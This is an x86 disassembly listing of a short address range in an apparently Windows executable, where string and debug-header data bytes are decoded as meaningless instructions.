  43399a:	add    BYTE PTR [ebx+0x0],al
  43399d:	push   ebx
  43399e:	add    BYTE PTR [edx+0x0],dl
  4339a1:	pop    edi
  4339a2:	add    BYTE PTR [ecx+0x0],dl
  4339a5:	dec    edi
  4339a6:	add    BYTE PTR [edi+0x0],al
  4339a9:	push   ecx
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	pop    ecx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],cl
  4339b3:	dec    edi
  4339b4:	add    BYTE PTR [ebp+0x0],dl
  4339b7:	cmp    DWORD PTR [eax],eax
  4339b9:	pop    edi
  4339ba:	add    BYTE PTR [edx],dh
  4339bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4339c0:	add    BYTE PTR ds:0x47005f00,dh
  4339c6:	add    BYTE PTR ds:0x48000000,dh
  4339cc:	add    BYTE PTR [edx+0x0],cl
  4339cf:	push   eax
  4339d0:	add    BYTE PTR [edi+0x0],bl
  4339d3:	cmp    BYTE PTR [eax],al
  4339d5:	add    BYTE PTR ss:0x55004100,dh
  4339dc:	add    BYTE PTR [edi+0x0],bl
  4339df:	push   edx
  4339e0:	add    BYTE PTR [edi],dh
  4339e2:	add    BYTE PTR [ecx+0x0],cl
  4339e5:	add    BYTE PTR [eax],al
  4339e7:	inc    esp
  4339e8:	add    BYTE PTR [ecx+0x0],dl
  4339eb:	inc    edx
  4339ec:	add    BYTE PTR [edi+0x0],bl
  4339ef:	push   ecx
  4339f0:	add    BYTE PTR [ecx+0x0],bl
  4339f3:	dec    edi
  4339f4:	add    BYTE PTR [eax+0x0],dl
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	dec    edx
  4339fa:	add    BYTE PTR [ecx+0x0],dl
  4339fd:	inc    esp
  4339fe:	add    BYTE PTR [edi+0x0],bl
  433a01:	dec    edx
  433a02:	add    BYTE PTR [eax],dh
  433a04:	add    BYTE PTR [ecx],dh
  433a06:	add    BYTE PTR [ebx+0x0],dl
  433a09:	push   ecx
  433a0a:	add    BYTE PTR [ecx],dh
  433a0c:	add    BYTE PTR [edi+0x0],bl
  433a0f:	push   edi
  433a10:	add    BYTE PTR [eax],al
  433a12:	add    BYTE PTR [ebx+0x0],cl
  433a15:	pop    edx
  433a16:	add    BYTE PTR [esi],dh
  433a18:	add    BYTE PTR [edi+0x0],bl
  433a1b:	inc    ebx
  433a1c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433a20:	add    BYTE PTR [edi+0x0],bl
  433a23:	push   edi
  433a24:	add    BYTE PTR [ebx],dh
  433a26:	add    BYTE PTR [esi+0x0],cl
  433a29:	push   ebp
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	dec    edx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],dl
  433a33:	aaa    
  433a34:	add    BYTE PTR [eax],bh
  433a36:	add    BYTE PTR [edi+0x0],bl
  433a39:	pop    eax
  433a3a:	add    BYTE PTR [edi+0x0],cl
  433a3d:	inc    edi
  433a3e:	add    BYTE PTR [edi+0x0],bl
  433a41:	xor    al,0x0
  433a43:	push   eax
  433a44:	add    BYTE PTR [ecx+0x0],cl
  433a47:	push   ebp
  433a48:	add    BYTE PTR [eax],al
  433a4a:	add    BYTE PTR [edi+0x0],dl
  433a4d:	push   esp
  433a4e:	add    BYTE PTR [ebx+0x0],cl
  433a51:	add    BYTE PTR [eax],al
  433a53:	add    BYTE PTR [edx+0x53],dl
  433a56:	inc    esp
  433a57:	push   ebx
  433a58:	(bad)  
  433a59:	test   al,ah
  433a5b:	adc    ch,BYTE PTR [ebx-0x5ab215bd]
  433a61:	sub    eax,0xf6159e2
  433a66:	in     eax,0x68
  433a68:	sbb    eax,DWORD PTR [eax]
  433a6a:	add    BYTE PTR [eax],al
  433a6c:	push   esp
  433a6d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433a71:	addr16 push edi
  433a73:	bound  bx,DWORD PTR [edx+0x45]
  433a77:	outs   dx,BYTE PTR ds:[esi]
  433a78:	pop    esp
  433a79:	je     0x433aee
  433a7b:	ja     0x433abe
  433a7d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a85:	js     0x433af6
  433a87:	jp     0x433af8
  433a89:	jns    0x433aef
  433a8b:	jp     0x433af5
  433a8d:	je     0x433af3
  433a8f:	jp     0x433af3
  433a91:	cs jo  0x433af8
  433a94:	bound  eax,QWORD PTR [eax]
	...
